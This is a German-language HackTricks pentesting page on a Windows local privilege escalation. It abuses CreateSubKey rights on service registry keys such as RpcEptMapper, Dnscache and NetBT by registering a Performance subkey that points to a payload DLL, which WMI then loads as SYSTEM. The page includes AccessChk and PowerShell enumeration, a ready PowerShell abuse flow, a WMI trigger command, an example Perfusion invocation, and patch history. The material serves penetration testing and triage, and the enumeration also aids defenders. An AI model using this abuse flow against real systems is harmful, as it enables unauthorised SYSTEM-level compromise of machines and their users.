# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Der ursprüngliche Beitrag ist** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Zusammenfassung

Wenn du auf einem Service-Registry-Key nur **`Create Subkey`** / **`AppendData/AddSubdirectory`** hast, ist das trotzdem ein guter Hinweis für Privesc. Du kannst normalerweise **`ImagePath`**, **`ServiceDll`** oder andere vorhandene Werte nicht direkt überschreiben, aber du kannst möglicherweise einen **`Performance`**-Child-Key unter:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Jedem anderen **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**-Key, bei dem dein Token **`KEY_CREATE_SUB_KEY`** hat

Der Trick ist, dass Windows weiterhin das alte **PerfLib V1**-Registrierungsmodell unterstützt. Wenn ein Service einen **`Performance`**-Subkey hat, kann Windows von dort eine DLL laden, wenn ein Consumer von Performance-Countern Daten anfordert.

Laut Microsoft-Dokumentation ist die minimale Registrierung:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Die offensive Kernaussage ist also: **verwirf einen Service-Registry-Fund nicht einfach nur, weil du nur `CreateSubKey` statt `SetValue` bekommen hast**.

## Warum das für Code Execution ausreicht

Der `Performance`-Unterschlüssel existiert bei diesen Services standardmäßig **meist nicht**, daher ist **`KEY_CREATE_SUB_KEY`** die Primitive, die du brauchst. Sobald der Key existiert und `Library`/`Open`/`Collect`/`Close` enthält, kann jeder **performance counter consumer** den DLL-Load auslösen.

Ein paar wichtige Details:

- Der Wert **`Library`** kann auf einen **vollständigen DLL-Pfad** zeigen.
- Die DLL muss **`OpenPerfData`**, **`CollectPerfData`** und **`ClosePerfData`** exportieren und `ERROR_SUCCESS` zurückgeben.
- Der Code läuft im **Kontext des Consumers**, **nicht unbedingt im Prozess des verwundbaren Services selbst**.
- Im klassischen Fall `RpcEptMapper` / `Dnscache` kann eine **WMI performance query** dazu führen, dass **`wmiprvse.exe`** die DLL als **`NT AUTHORITY\SYSTEM`** lädt.

Deshalb ist diese Primitive bei der Triage leicht zu übersehen: Der übergeordnete Service-Key ist nicht „vollständig beschreibbar“, aber trotzdem weaponizable.

## Schnelle Enumeration

Manueller Spot-Check mit **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
PowerShell-Beispiel, um nach Principals mit niedrigen Rechten mit **`CreateSubKey`** auf Service-Keys zu suchen:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Nützliche Tools:

- **PrivescCheck**: `Get-ModifiableRegistryPath` wurde speziell entwickelt, um diese Art von Problem zu erkennen.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatisiert DLL-Drop, `Performance`-Registrierung, WMI-Trigger, Token-Duplizierung und Cleanup auf alten verwundbaren Zielen (zum Beispiel: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Erstelle den `Performance`-Subkey und fülle die erforderlichen Werte:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Dann einen **privileged** Performance-Consumer auslösen. Ein klassisches Beispiel ist eine WMI-Abfrage über `Win32_Perf*`-Klassen:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Betriebsnotizen:

- Das Starten von **`perfmon.exe`** ist nützlich, um zu prüfen, ob die Counter-Registrierung korrekt ist, aber das lädt die DLL normalerweise nur in **deinem eigenen Benutzerkontext**.
- Für ein echtes LPE triggert man einen **privilegierten** Consumer wie **WMI**.
- Wenn du deinen eigenen Exploit schreibst, lässt das direkte Starten von `cmd.exe` aus der DLL heraus dich meist mit einer Shell in **session 0** zurück. **`Perfusion`** löst das, indem es das privilegierte Token in einen Prozess dupliziert, der suspendiert in der Session des Angreifers erstellt wurde.
- Passe die DLL-Architektur an den Ziel-Consumer an (**x64 auf x64-Systemen**).

## Versionshinweise / aktuelle Entwicklungen

Historisch waren die eingebauten schwachen Keys:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` und `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` weist darauf hin, dass die Updates vom **April 2021** den einfachen Exploit-Pfad auf aktualisiertem **Windows 8 / Windows Server 2012** entfernt haben, während **Windows 7 / Windows Server 2008 R2** weiterhin über **`Dnscache`** angreifbar blieb.

Dieses Primitive ist **nicht nur historisch**. Im **Januar 2025** patchte Microsoft ein verwandtes AD DS-Problem, bei dem Mitglieder von **`Network Configuration Operators`** Unterschlüssel unter **`Dnscache`** und **`NetBT`** erstellen konnten, und dieselbe Idee der **Performance-counter DLL registration** konnte wiederverwendet werden, um auf unterstützten Systemen **SYSTEM** zu erreichen.

Die moderne Lektion ist also allgemein: Immer wenn ein niedrig privilegierter Principal **`CreateSubKey`** auf **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** hat, prüfe, ob ein **`Performance`**-Unterschlüssel ausreicht, bevor du den Befund verwirfst.

## Referenzen

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
